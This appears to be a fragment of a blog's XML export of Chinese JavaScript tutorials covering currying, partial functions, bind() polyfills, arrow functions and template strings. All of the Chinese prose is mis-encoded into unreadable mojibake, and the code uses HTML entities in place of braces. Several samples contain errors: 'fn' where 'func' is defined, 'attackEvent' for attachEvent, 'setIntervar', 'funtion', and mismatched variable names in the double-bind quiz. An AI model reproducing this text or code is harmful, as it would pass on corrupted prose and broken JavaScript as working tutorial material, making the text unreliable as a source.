å‡½æ•°ï¼Œè¿”å›žå¦ä¸€ä¸ªåŒ…è£…å™¨ï¼Œæä¾›è¿žæŽ¥ä¹‹å‰çš„å‚æ•°ä¸€èµ·ä½œä¸ºæ–°çš„å‚æ•°é‡æ–°è°ƒç”¨ curried ï¼Œè¿”å›žä¸€ä¸ªæ–°åå‡½æ•°ï¼ˆå¦‚æžœå‚æ•°ä¸å¤Ÿï¼‰æˆ–æœ€ç»ˆç»“æžœã€‚ ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œè°ƒç”¨ curriedSum(1)(2)(3)çš„è¿‡ç¨‹ï¼š ç¬¬ä¸€æ¬¡è°ƒç”¨ curried(1)ï¼Œåœ¨è¯æ³•çŽ¯å¢ƒä¸­è®°ä½1ï¼Œè¿”å›žåŒ…è£…å™¨ pass ä½¿ç”¨å‚æ•° 2 è°ƒç”¨åŒ…è£…å™¨ï¼Œå…¶å¸¦ç€å‰é¢çš„å‚æ•°1ï¼Œè¿žæŽ¥å®ƒä»¬ç„¶åŽè°ƒç”¨ curried(1,2)ï¼Œå› ä¸ºå‚æ•°æ•°é‡ä»ç„¶å°äºŽ3ï¼Œè¿”å›žåŒ…è£…å™¨ pass å†æ¬¡è°ƒç”¨åŒ…è£…å™¨ pass,å¸¦ç€ä¹‹å‰çš„å‚æ•°ï¼ˆ1ï¼Œ2ï¼‰,åŠ ä¸Š3ï¼Œå¹¶è°ƒç”¨ curried(1,2,3)ã€‚æœ€ç»ˆæœ‰ä¸‰ä¸ªå‚æ•°ï¼Œä¼ é€’ç»™åŽŸå‡½æ•°ï¼Œå› ä¸ºå‚æ•°ä¸ªæ•°ç›¸ç­‰ï¼Œç›´æŽ¥è°ƒç”¨ func å‡½æ•°ã€‚ è¿˜æœ‰ä¸€ç§æ€§èƒ½æ›´åŠ å¥½çš„ï¼Œä¸è¿‡åˆ¤æ–­æ¡ä»¶åè¿‡æ¥çš„å†™æ³•: 1234567891011121314function curry(func)&#123; function curried(restProp,argsList)&#123; return restProp === 0 ? fn.apply(null,argsList):function(x)&#123; return curried(restProp - 1,argsList.concat(x)); &#125; &#125; return curried(func.length,[]);&#125;// ES6çš„å†™æ³•const curry = func =&gt;&#123; const curried = (restProp,argsList)=&gt; restProp === 0 ?fn(...argsList):x=&gt;curried(restProp - 1,argsList.concat(x)); return curried(func.length,[])&#125; æ€»ç»“ å½“æŠŠå·²çŸ¥çš„ä¸€äº›å‚æ•°å›ºå®šï¼Œç»“æžœå‚æ•°è¢«ç§°ä¸ºåå‡½æ•°ï¼Œé€šè¿‡ä½¿ç”¨bind èŽ·å¾—åå‡½æ•°ï¼Œä¹Ÿæœ‰å…¶ä»–æ–¹å¼å®žçŽ°ã€‚ ç”¨é€”ï¼šå½“æˆ‘ä»¬ä¸æƒ³é‡å¤å¤šæ¬¡è°ƒç”¨ç›¸åŒçš„å‚æ•°çš„æ—¶å€™ï¼Œåå‡½æ•°æ˜¯å¾ˆä¾¿æ·çš„ï¼Œæœ‰ send(from,to)å‡½æ•°ï¼Œå¦‚æžœ from æ€»æ˜¯ç›¸åŒçš„ï¼Œå¯ä»¥ä½¿ç”¨åå‡½æ•°ç®€åŒ–è°ƒç”¨ æŸ¯é‡ŒåŒ–æ˜¯è½¬æ¢å‡½æ•°è°ƒç”¨ä»Ž f(a,b,c)è‡³f(a)(b)(c)ï¼ŒJavaScript é€šå¸¸æ—¢å¯ä»¥å®žçŽ°æ­£å¸¸è°ƒç”¨ï¼Œä¹Ÿå¯ä»¥å®žçŽ°å‚æ•°ä¸è¶³æ—¶çš„åå‡½æ•°æ–¹å¼çš„è°ƒç”¨ã€‚ ç”¨é€”ï¼š å‚æ•°è¿”å›ž æå‰è¿”å›ž å»¶è¿Ÿè®¡ç®—æˆ–è¿è¡Œï¼Œå‚æ•°éšæ„è®¾ç½® æå‰è¿”å›žï¼Œå¸¸è§çš„ä¾‹å­ï¼šå…¼å®¹çŽ°ä»£æµè§ˆå™¨ä»¥åŠ IE æµè§ˆå™¨çš„äº‹ä»¶æ·»åŠ æ–¹æ³• 1234567891011var addEvent = function(el,type,fn,callback,capture)&#123; if(window.addEventListener)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture) &#125;else if(window.attackEvent)&#123; el.attackEvent('on'+type,function(e)&#123; fn.call(el,e); &#125;) &#125;&#125; ä¸Šé¢çš„æ–¹æ³•æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯æ¯æ¬¡ç”¨ addEvent ä¸ºå…ƒç´ æ·»åŠ äº‹ä»¶çš„æ—¶å€™ï¼Œ(ie7/8)éƒ½ä¼šèµ°ä¸€éif..else if å…¶å®žåªè¦åˆ¤å®šä¸€æ¬¡å°±å¥½äº†ã€‚è¿™ä¸ªæ—¶å€™å°±å¯ä»¥é‡‡ç”¨æŸ¯é‡ŒåŒ–äº†ã€‚ 123456789101112131415var addEvent = (function()&#123; if(window.addEventListener)&#123; return function(el,type,fn,capture)&#123; el.addEventListener(type,function(e)&#123; fn.call(el,e); &#125;,capture) &#125; &#125;else if(window.attackEvent)&#123; return function(el,type,fn,capture)&#123; el.attackEvent('on'+type,function(e)&#123; fn.call(el,e); &#125;) &#125; &#125;&#125;); åˆå§‹addEventçš„æ‰§è¡Œå…¶å®žåªå®žçŽ°äº†éƒ¨åˆ†çš„åº”ç”¨ï¼ˆåªæœ‰ä¸€æ¬¡çš„ifâ€¦else ifâ€¦åˆ¤å®šï¼‰ï¼Œè€Œå‰©ä½™çš„å‚æ•°åº”ç”¨éƒ½æ˜¯å…¶è¿”å›žå‡½æ•°å®žçŽ°çš„ï¼Œå…¸åž‹çš„æŸ¯é‡ŒåŒ–æ€æƒ³ã€‚ å’Œ setTimeout ä¸€èµ·ä½¿ç”¨12345678910111213function Bloomer()&#123; this.petalCount = Math.ceil(Math.random() * 12) + 1;&#125;// 1 ç§’åŽç”¨ declare å‡½æ•°Bloomer.prototype.bloom = function()&#123; window.setTimeout(this.declare.bind(this),1000);&#125;Bloomer.prototype.declare = function()&#123; console.log(`æˆ‘æœ‰ $&#123;this.petalCount&#125;æœµèŠ±ç“£ï¼`);&#125;var bloo = new Bloomer();bloo.bloom(); //æˆ‘æœ‰5æœµèŠ±ç“£ï¼ æ·å¾„bind()ä¹Ÿå¯ä»¥ä¸ºéœ€è¦ç‰¹å®šthiså€¼çš„å‡½æ•°åˆ›é€ æ·å¾„ã€‚ ä¾‹å¦‚ï¼šè¦å°†ä¸€ä¸ªç±»æ•°ç»„è½¬æ¢æˆä¸ºæ•°ç»„ï¼Œå½“ç„¶è¿™ä¸ªæ˜¯åœ¨å‡ºçŽ°ES6ä¹‹å‰çš„ 1234var unBoundSlice = Array.prototype.slice;var slice = Function.prototype.call.bind(unBoundSlice);slice(arguments); å®žçŽ°é¦–å…ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ç»™ç›®æ ‡å‡½æ•°æŒ‡å®šä½œç”¨åŸŸæ¥ç®€å•å®žçŽ° bind æ–¹æ³• 123456Function.prototype.bind = function(context)&#123; self = this; // ä¿å­˜ thisï¼Œå³è°ƒç”¨ bind æ–¹æ³•çš„ç›®æ ‡å‡½æ•° return function()&#123; return self.apply(context,arguments); &#125;&#125; è€ƒè™‘åˆ°æŸ¯é‡ŒåŒ–çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æž„å»ºä¸€ä¸ªæ›´åŠ å¥å£®çš„bind() 123456789Function.prototype.bind = function(context)&#123; var args = Array.prototype.slice.call(arguments,1); self = this; return function()&#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return self.apply(context,finalArgs); &#125;&#125; è¿™æ¬¡çš„bind æ–¹æ³•å¯ä»¥ç»‘å®šå¯¹è±¡ï¼Œä¹Ÿæ”¯æŒåœ¨ç»‘å®šçš„æ—¶å€™ä¼ å‚ã€‚ JavaScript çš„å‡½æ•°è¿˜å¯ä»¥ä½œä¸ºæž„é€ å‡½æ•°ï¼Œé‚£ä¹ˆç»‘å®šåŽçš„å‡½æ•°ç”¨è¿™ç§æ–¹å¼è°ƒç”¨æ—¶ï¼Œæƒ…å†µå°±æ¯”è¾ƒå¾®å¦™äº†ï¼Œéœ€è¦æ¶‰åŠåˆ°åŽŸåž‹é“¾çš„ä¼ é€’ï¼š 12345678910111213Function.prototype.bind = function(context)&#123; var args = Array.prototype.slice(arguments,1), F = function()&#123;&#125;, self = this, bound = function()&#123; var innerArgs = Array.prototype.slice.call(arguments); var finalArgs = args.concat(innerArgs); return self.apply((this instanceof F ? this : context),finalArgs); &#125; F.prototype = self.prototype; bound.prototype = new F(); return bound;&#125; è¿™æ˜¯ã€ŠJavaScript Web Applicationã€‹ä¸€ä¹¦ä¸­å¯¹bind()çš„å®žçŽ°ï¼šé€šè¿‡è®¾ç½®ä¸€ä¸ªä¸­è½¬æž„é€ å‡½æ•°Fï¼Œä½¿ç»‘å®šåŽçš„å‡½æ•°ä¸Žè°ƒç”¨bind()çš„å‡½æ•°å¤„äºŽåŒä¸€åŽŸåž‹é“¾ä¸Šï¼Œç”¨newæ“ä½œç¬¦è°ƒç”¨ç»‘å®šåŽçš„å‡½æ•°ï¼Œè¿”å›žçš„å¯¹è±¡ä¹Ÿèƒ½æ­£å¸¸ä½¿ç”¨instanceofï¼Œå› æ­¤è¿™æ˜¯æœ€ä¸¥è°¨çš„bind()å®žçŽ°ã€‚ å¯¹äºŽä¸ºäº†åœ¨æµè§ˆå™¨ä¸­èƒ½æ”¯æŒbind()å‡½æ•°ï¼Œåªéœ€è¦å¯¹ä¸Šè¿°å‡½æ•°ç¨å¾®ä¿®æ”¹å³å¯ï¼š 1234567891011121314151617181920Function.prototype.bind = function (oThis) &#123; if (typeof this !== "function") &#123; throw new TypeError("Function.prototype.bind - what is trying to be bound is not callable"); &#125; var aArgs = Array.prototype.slice.call(arguments, 1), fToBind = this, fNOP = function () &#123;&#125;, fBound = function () &#123; return fToBind.apply( this instanceof fNOP &amp;&amp; oThis ? this : oThis || window, aArgs.concat(Array.prototype.slice.call(arguments)) ); &#125;; fNOP.prototype = this.prototype; fBound.prototype = new fNOP(); return fBound;&#125;; æœ‰ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜ï¼Œå¦‚æžœè¿žç»­ bind ä¸¤æ¬¡æˆ–è€…æ˜¯ä¸‰æ¬¡ï¼Œé‚£ä¹ˆè¾“å‡ºçš„ç»“æžœæ˜¯ä»€ä¹ˆï¼Ÿ 123456789101112131415161718192021var bar = function()&#123; console.log(this.x);&#125;var foo = &#123; x:3&#125;var sed = &#123; x:4&#125;var func = bar.bind(foo).bind(sed);foo(); // ?var fix = &#123; x:5&#125;var func = bar.bind(foo).bind(sed).bind(fiv);func(); // ï¼Ÿ ç­”æ¡ˆæ˜¯ã€‚ä¸¤æ¬¡ä»ç„¶å°†è¾“å‡º3ï¼ŒåŽŸå› æ˜¯åœ¨ JavaScript ä¸­ï¼Œå¤šæ¬¡çš„ bind æ˜¯æ— æ•ˆçš„ã€‚æ›´æ·±å±‚çš„åŽŸå› æ˜¯ï¼Œbind çš„å®žçŽ°ç›¸å½“äºŽä½¿ç”¨å‡½æ•°åœ¨å†…éƒ¨åŒ…äº†ä¸€ä¸ª call/applyï¼Œä¸¤æ¬¡ bind ç›¸å½“äºŽå†åŒ…ä½ç¬¬ä¸€æ¬¡çš„ bind,æ•…ç¬¬äºŒæ¬¡ä»¥åŽçš„ bind æ˜¯æ— æ³•ç”Ÿæ•ˆçš„ã€‚ å‚è€ƒé“¾æŽ¥ï¼šJSä¸­çš„callã€applyã€bindæ–¹æ³•è¯¦è§£ jsåŸºç¡€è¿›é˜¶â€“å…³äºŽArray.prototype.slice.call(arguments) çš„æ€è€ƒ JSä¸­çš„æŸ¯é‡ŒåŒ– åŠ ç²¾å·§çš„è‡ªåŠ¨æŸ¯é‡ŒåŒ–å®žçŽ° ç†è§£JSé‡Œçš„åå‡½æ•°ä¸ŽæŸ¯é‡ŒåŒ–]]></content>
      <categories>
        <category>ES6ç›¸å…³</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Arrow_functions]]></title>
    <url>%2F2018-06-11-Arrow-function.html</url>
    <content type="text"><![CDATA[ç®­å¤´å‡½æ•°åŸºç¡€è¯­æ³• (å‚æ•°1,å‚æ•°2,â€¦å‚æ•°N) =&gt;{å‡½æ•°å£°æ˜Ž}(å‚æ•°1,å‚æ•°2,â€¦å‚æ•°N) =&gt; è¡¨è¾¾å¼(å•ä¸€)//ç›¸å½“äºŽï¼š(å‚æ•°1,å‚æ•°2,â€¦å‚æ•°N) =&gt;{return è¡¨è¾¾å¼;} //å½“åªæœ‰ä¸€ä¸ªå‚æ•°æ—¶ï¼Œåœ†æ‹¬å·æ˜¯å¯é€‰çš„:(å•ä¸€å‚æ•°) =&gt; {å‡½æ•°å£°æ˜Ž}å•ä¸€å‚æ•° =&gt; {å‡½æ•°å£°æ˜Ž} //æ— å‚æ•°çš„å‡½æ•°åº”è¯¥å†™æˆä¸€å¯¹åœ†æ‹¬å·() =&gt; {å‡½æ•°å£°æ˜Ž} é«˜çº§è¯­æ³• //åŠ æ‹¬å·çš„å‡½æ•°ä½“è¿”å›žå¯¹è±¡å­—é¢è¡¨è¾¾å¼å‚æ•° =&gt;({foo:bar}) //æ”¯æŒå‰©ä½™å‚æ•°å’Œé»˜è®¤å‚æ•°(å‚æ•°1,å‚æ•°2,â€¦rest) =&gt; {å‡½æ•°å£°æ˜Ž}(å‚æ•°1 = é»˜è®¤å€¼1,å‚æ•°2,â€¦å‚æ•°N = é»˜è®¤å€¼N) =&gt; {å‡½æ•°å£°æ˜Ž} //åŒæ ·æ”¯æŒå‚æ•°åˆ—è¡¨è§£æž„let f = ([a,b] = [1,2],{x:c} = {x: a + b}) =&gt; a + b +c;f(); //6 æè¿°å¼•å…¥ç®­å¤´å‡½æ•°æœ‰ä¸¤ä¸ªæ–¹é¢çš„ä½œç”¨ï¼šæ›´ç®€çŸ­çš„å‡½æ•°å¹¶ä¸”ä¸ç»‘å®š this 12345678910var a = ['fiftyfifty','done','you','goodjob'];a.map(function(a)&#123; return a.length;&#125;); //[10,4,3,7]a.map(a) =&gt; &#123; return a.length;&#125; //[10,4,3,7]a.map(a =&gt; a.length); //[10,4,3,7] ä¸ç»‘å®š thisåœ¨ç®­å¤´å‡½æ•°å‡ºçŽ°ä¹‹å‰ï¼Œæ¯ä¸ªæ–°å®šä¹‰çš„å‡½æ•°éƒ½æœ‰è‡ªå·±çš„ this å€¼(åœ¨æž„é€ å‡½æ•°çš„æƒ…å†µä¸‹æ˜¯ä¸€ä¸ªæ–°å¯¹è±¡ï¼Œåœ¨ä¸¥æ ¼æ¨¡å¼çš„å‡½æ•°è°ƒç”¨ä¸­ä¸º undefined,å¦‚æžœè¯¥å‡½æ•°è¢«ç§°ä¸ºâ€œå¯¹è±¡æ–¹æ³•â€ åˆ™ä¸ºåŸºç¡€å¯¹è±¡ç­‰ ) 123456789101112funtion Person()&#123; //Person() æž„é€ å‡½æ•°å®šä¹‰ `this` ä½œä¸ºè‡ªå·±çš„å®žä¾‹ this.age = 0; setInterval(function growUp()&#123; //åœ¨éžä¸¥æ ¼æ¨¡å¼ï¼ŒgrowUp()å‡½æ•°å®šä¹‰ `this` ä½œä¸ºå…¨å±€å¯¹è±¡, //åœ¨ä¸ŽPerson() æž„é€ å‡½æ•°ä¸­å®šä¹‰çš„ `this` å¹¶ä¸ç›¸åŒ this.age++; &#125;,1000);&#125;var p = new Person(); åœ¨ ECMAScript 3/5 ä¸­ï¼Œé€šè¿‡å°† this å€¼åˆ†é…ç»™å°é—­çš„å˜é‡ï¼Œå¯ä»¥è§£å†³ this é—®é¢˜ã€‚ 12345678function Person()&#123; var that = this; this.age = 0; setIntervar(function growUp()&#123; //å›žè°ƒå¼•ç”¨çš„æ˜¯ `that` å˜é‡ï¼Œå…¶å€¼æ˜¯é¢„æœŸçš„å¯¹è±¡ that.age++; &#125;,1000);&#125; æˆ–è€…ï¼Œå¯ä»¥åˆ›å»ºç»‘å®šå‡½æ•°ï¼Œä»¥ä¾¿å°†é¢„å…ˆåˆ†é…çš„ this å€¼ä¼ é€’åˆ°ç»‘å®šçš„ç›®æ ‡å‡½æ•°ä¸Š ç®­å¤´å‡½æ•°ä¸ä¼šåˆ›å»ºè‡ªå·±çš„ this ,å®ƒä¼šä»Žè‡ªå·±çš„ä½œç”¨åŸŸé“¾çš„ä¸Šä¸€å±‚ç»§æ‰¿ this .å› æ­¤ï¼Œåœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œä¼ é€’ç»™ setInterval çš„å‡½æ•°å†…çš„ this ä¸Žå°é—­å‡½æ•°ä¸­çš„ this ç›¸åŒ 1234567function Person()&#123; this.age = 0; setInterval(() =&gt;&#123; this.age++; //|this| æ­£ç¡®æŒ‡å‘ person å¯¹è±¡ &#125;,1000);&#125;var p = new Person(); é€šè¿‡ call æˆ–è€… apply è°ƒç”¨ç”±äºŽç®­å¤´å‡½æ•°æ²¡æœ‰è‡ªå·±çš„ this æŒ‡é’ˆï¼Œé€šè¿‡ call() æˆ–è€… apply() æ–¹æ³•è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œåªèƒ½ä¼ é€’å‚æ•° 1234567891011121314151617var adder = &#123; base:1, add:function(a)&#123; var f = v =&gt; v + this.base; return f(a); &#125;, addThruCall: function(a)&#123; var f = v =&gt; v + this.base; var b = &#123; base: 2 &#125;; return f.call(b,a); &#125;&#125;console.log(adder.add(1)); //2console.log(adder.addThruCall(1)); //2 ä¸æ˜¯3 ä¸ç»‘å®š argumentsç®­å¤´å‡½æ•°ä¸ç»‘å®š arguments å¯¹è±¡ï¼Œåœ¨ä¸‹ä¾‹ä¸­ï¼Œ arguments åªæ˜¯å¼•ç”¨äº†å°é—­ä½œç”¨åŸŸå†…çš„ arguments 123456789var arguments = [1,2,3];var arr = () =&gt; arguments[0];arr(); //1function foo(n)&#123; var f = () =&gt; arguments[0] + n; //éšå¼ç»‘å®š foo å‡½æ•°çš„ arguments å¯¹è±¡ï¼Œarguments[0] æ˜¯ n return f();&#125;foo(1); //2 å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½¿ç”¨å‰©ä½™å‚æ•°æ˜¯ç›¸è¾ƒä½¿ç”¨ arguments å¯¹è±¡çš„æ›´å¥½é€‰æ‹© 123456function foo()&#123; var f = (...args) =&gt; args[0]; return f(2);&#125;foo(1); //2 åƒæ–¹æ³•ä¸€æ ·ä½¿ç”¨ç®­å¤´å‡½æ•°123456789101112'use strict';var obj = &#123; i:10, b:() =&gt; console.log(this.i,this), c:function()&#123; console.log(this.i,this); &#125;&#125;obj.b();//undefinedobj.c();//10,Object&#123;...&#125; ä½¿ç”¨ new æ“ä½œç¬¦ç®­å¤´å‡½æ•°ä¸èƒ½ç”¨ä½œæž„é€ å™¨ï¼Œå’Œ new ä¸€èµ·ç”¨ä¼šæŠ›å‡ºé”™è¯¯ var Foo = () =&gt;{};var foo = new Foo(); //TypeError:Foo is not a constructor ä½¿ç”¨ prototype å±žæ€§ç®­å¤´å‡½æ•°æ²¡æœ‰ prototype å±žæ€§ var Foo = () =&gt;{}console.log(Foo.prototype); //undefined å‡½æ•°ä½“ç®­å¤´å‡½æ•°å¯ä»¥æœ‰ä¸€ä¸ªç®€å†™ä½“æˆ–è€…æ˜¯å¸¸è§çš„å—ä½“åœ¨ä¸€ä¸ªç®€å†™ä½“é‡ï¼Œåªéœ€è¦ä¸€ä¸ªè¡¨è¾¾å¼ï¼Œå¹¶é™„åŠ ä¸€ä¸ªéšå¼çš„è¿”å›žå€¼ï¼Œåœ¨å—ä½“ä¸­ï¼Œå¿…é¡»ä½¿ç”¨æ˜Žç¡®çš„ return è¯­å¥ var func = x =&gt; x * x;//ç®€å†™å‡½æ•° çœç•¥return var func = (x,y) =&gt; {return x+y;};//å¸¸è§„ç¼–å†™ï¼Œæ˜Žç¡®çš„è¿”å›žå€¼ è¿”å›žå¯¹è±¡å­—é¢é‡ä½¿ç”¨ params =&gt;{object:literal} è¿™ç§ç®€å•çš„è¯­æ³•è¿”å›žå¯¹è±¡å­—é¢é‡æ˜¯è¡Œä¸é€šçš„è®°å¾—ç”¨åœ†æ‹¬å·æŠŠå­—é¢é‡åŒ…èµ·æ¥ var func = () =&gt; ({foo:1}); æ¢è¡Œç®­å¤´å‡½æ•°åœ¨å‚æ•°å’Œç®­å¤´ä¹‹é—´ä¸èƒ½æ¢è¡Œ è§£æžé¡ºåºè™½ç„¶ç®­å¤´å‡½æ•°ä¸­çš„ç®­å¤´ä¸æ˜¯è¿ç®—ç¬¦ï¼Œä½†ç®­å¤´å‡½æ•°å…·æœ‰ä¸Žå¸¸è§„å‡½æ•°ä¸åŒçš„ç‰¹æ®Šè¿ç®—ç¬¦ä¼˜å…ˆçº§è§£æžè§„åˆ™ 12345678910let callback;callback = callback || function()&#123;&#125;; //okcallback = callback || (() =&gt;&#123;&#125;); //ok//ç©ºçš„ç®­å¤´å‡½æ•°è¿”å›ž undefinedlet empty = () =&gt; &#123;&#125;(() =&gt; 'foobar')();//Return "foobar"//è¿™æ˜¯ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°è¡¨è¾¾å¼ ç®­å¤´å‡½æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨æ¡ä»¶ï¼ˆä¸‰å…ƒï¼‰è¿ç®—ç¬¦ï¼š12345var simple = a =&gt; a &gt; 15 ? 15 : a;simple(16); //15simple(10); //10let max = (a,b) =&gt; a &gt; b ? a : b; ç®­å¤´å‡½æ•°å†…å®šä¹‰çš„å˜é‡åŠå…¶ä½œç”¨åŸŸ123456789101112131415//å¸¸è§„å†™æ³•var greeting = () =&gt; &#123; let now = new Date();return("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // ReferenceError: now is not defined æ ‡å‡†çš„letä½œç”¨åŸŸ// å‚æ•°æ‹¬å·å†…å®šä¹‰çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡ï¼ˆé»˜è®¤å‚æ•°ï¼‰var greeting = (now = new Date()) =&gt; "Good" + ((now.getHours() &gt; 17) ? "evening." : "day.");console.log(now); // ReferenceError: now is not defined//å¯¹æ¯”ï¼šå‡½æ•°ä½“å†…&#123;&#125; ä¸ä½¿ç”¨var å®šä¹‰çš„å˜é‡æ˜¯å…¨å±€å˜é‡var greeting = () =&gt; &#123;now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // Fri Dec 22 2017 10:01:00 GMT+0800 (ä¸­å›½æ ‡å‡†æ—¶é—´)//å¯¹æ¯”ï¼šå‡½æ•°ä½“å†…ç”¨&#123;&#125; ç”¨varå®šä¹‰çš„å˜é‡æ˜¯å±€éƒ¨å˜é‡var greeting = () =&gt;&#123;var now = new Date(); return ("Good" + ((now.getHours() &gt; 17) ? "evening." : "day."));&#125;console.log(now); // ReferenceError: now is not defined ç®­å¤´å‡½æ•°ä¹Ÿå¯ä»¥ä½¿ç”¨é—­åŒ…1234567891011121314151617181920//æ ‡å‡†çš„é—­åŒ…å‡½æ•°function A()&#123; var i = 0; return function b()&#123; return (++i); &#125;;&#125;;var v = A();v(); //1v(); //2//ç®­å¤´å‡½æ•°ä½“çš„é—­åŒ… (i=0 æ˜¯é»˜è®¤å‚æ•°)var Add = (i=0) =&gt; &#123;return (() =&gt; (++i))&#125;;var v = Add();v(); //1v(); //2//å› ä¸ºåªæœ‰ä¸€ä¸ªè¿”å›žï¼Œreturn ä»¥åŠæ‹¬å·ä¹Ÿå¯ä»¥çœç•¥var Add = (i=0) =&gt; (++i);]]></content>
      <categories>
        <category>ES6ç›¸å…³</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[template_strings]]></title>
    <url>%2F2018-06-09-templateString.html</url>
    <content type="text"><![CDATA[æ¨¡æ¿å­—ç¬¦ä¸²æ¨¡æ¿å­—é¢é‡æ˜¯å…è®¸åµŒå…¥è¡¨è¾¾å¼çš„å­—ç¬¦ä¸²å­—é¢é‡ `string text` `string text line 1` `string text line 2` `string text ${expression} string text` tag `string text ${expression} string text` æè¿°æ¨¡æ¿å­—ç¬¦ä¸²ä½¿ç”¨åå¼•å·ï¼ˆ``ï¼‰æ¥ä»£æ›¿æ™®é€šå­—ç¬¦ä¸²ä¸­çš„åŒå¼•å·å’Œå•å¼•å·ã€‚æ¨¡å—å­—ç¬¦ä¸²å¯ä»¥åŒ…å«ç‰¹æ®Šè¯­æ³•ï¼ˆ${expression}ï¼‰çš„å ä½ç¬¦ã€‚å ä½ç¬¦ä¸­çš„è¡¨è¾¾å¼å’Œå‘¨å›´çš„æ–‡æœ¬ä¼šä¸€èµ·ä¼ é€’ç»™ä¸€ä¸ªé»˜è®¤å‡½æ•°ï¼Œè¯¥å‡½æ•°è´Ÿè´£å°†æ‰€æœ‰çš„éƒ¨åˆ†è¿žæŽ¥èµ·æ¥ï¼Œå¦‚æžœä¸€ä¸ªæ¨¡æ¿å­—ç¬¦ä¸²ç”±è¡¨è¾¾å¼å¼€å¤´ï¼Œåˆ™è¯¥å­—ç¬¦ä¸²è¢«ç§°ä¸ºå¸¦æ ‡ç­¾çš„æ¨¡æ¿å­—ç¬¦ä¸²ï¼Œè¯¥è¡¨è¾¾å¼é€šå¸¸æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒä¼šåœ¨æ¨¡æ¿å­—ç¬¦ä¸²å¤„ç†åŽè¢«è°ƒç”¨ï¼Œåœ¨è¾“å‡ºæœ€ç»ˆç»“æžœå‰ï¼Œéƒ½å¯ä»¥ä½¿ç”¨è¯¥å‡½æ•°æ¥å¯¹æ¨¡æ¿å­—ç¬¦ä¸²è¿›è¡Œæ“ä½œå¤„ã€‚åœ¨æ¨¡æ¿å­—ç¬¦ä¸²å†…ä½¿ç”¨åå¼•å·ï¼ˆ`ï¼‰æ—¶ï¼Œéœ€è¦åœ¨å®ƒçš„å‰é¢åŠ è½¬ç§»ç¬¦ï¼ˆ\ï¼‰ `\ === â€œ`â€œ //â€“&gt; true å¤šè¡Œå­—ç¬¦ä¸²åœ¨æ–°è¡Œä¸­æ’å…¥ä»»ä½•å­—ç¬¦éƒ½æ˜¯æ¨¡æ¿å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä½¿ç”¨æ™®é€šå­—ç¬¦ä¸²ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼èŽ·å¾—å¤šè¡Œå­—ç¬¦ä¸² console.log(`string text line 1\n`+`string text line 2`);//â€œstring text line 1//string text line 2â€ èŽ·å¾—åŒæ ·çš„å¤šè¡Œå­—ç¬¦ä¸²ï¼Œåªéœ€ä½¿ç”¨ä»¥ä¸‹ä»£ç  console.log(`string text line 1 string text line 2`);//â€œstring text line 1//string text line 2â€ æ’å…¥è¡¨è¾¾å¼åœ¨æ™®é€šå­—ç¬¦ä¸­æ’å…¥è¡¨è¾¾å¼ var a = 5;var b = 10;console.log(â€˜sum isâ€™ +(a+b) + â€˜and\ndoubleSum is â€˜ + (a+b)*2 +â€™.â€™ );//sum is 15 and//doubleSum is 30. é€šè¿‡æ¨¡æ¿å­—ç¬¦ä¸²ç”±æ›´ä¼˜é›…çš„æ–¹å¼æ¥è¡¨ç¤º var a = 5;var b = 10;console.log(` sum is ${a+b} and doubleSum is ${(a+b)*2}. `); åµŒå¥—æ¨¡æ¿åœ¨æŸäº›æ—¶å€™ï¼ŒåµŒå¥—æ¨¡æ¿å…·æœ‰å¯é…ç½®å­—ç¬¦ä¸²çš„æœ€ç®€å•ä¹Ÿæ˜¯æ›´å¯è¯»çš„æ–¹æ³•ï¼Œåœ¨æ¨¡æ¿ä¸­ï¼Œåªéœ€åœ¨æ¨¡æ¿å†…çš„å ä½ç¬¦ ${} å†…ä½¿ç”¨å®ƒä»¬ï¼Œå°±å¯ä»¥è½»æ¾åœ°ä½¿ç”¨å†…éƒ¨åå¼•å·ã€‚ ä¾‹å¦‚ï¼šå¦‚æžœæ¡ä»¶aæ˜¯çœŸçš„ï¼Œé‚£ä¹ˆå°±è¿”å›žè¿™ä¸ªæ¨¡æ¿åŒ–çš„æ–‡å­— ES5ï¼š var classes = â€˜handerâ€™classes += (â€˜isLargeScreen() ? â€˜â€™: item.isCollapsed ? â€˜icon-expanderâ€™ : â€˜icon-collapserâ€™); ES6ä½¿ç”¨æ¨¡æ¿æ–‡å­—æ²¡æœ‰åµŒå¥— const classes = `header ${isLargeScreen() ? â€˜â€™ : (item.isCollapsed) ? â€˜icon-expanderâ€™ : â€˜icon-collapserâ€™)}`; ES6ä½¿ç”¨åµŒå¥—æ¨¡æ¿å­—é¢é‡ const classes = `header ${isLargeScreen() ? â€˜â€™ : `icon-${item.isCollapsed ? â€˜expanderâ€™ : â€˜collapserâ€™}`}`; å¸¦æ ‡ç­¾çš„æ¨¡æ¿å­—ç¬¦ä¸²æ›´é«˜çº§çš„å½¢å¼çš„æ¨¡å—å­—ç¬¦ä¸²æ˜¯å¸¦æ ‡ç­¾çš„æ¨¡å—å­—ç¬¦ä¸²ã€‚æ ‡ç­¾å¯ä»¥ç”¨å‡½æ•°è§£æžæ¨¡å—å­—ç¬¦ä¸²ã€‚æ 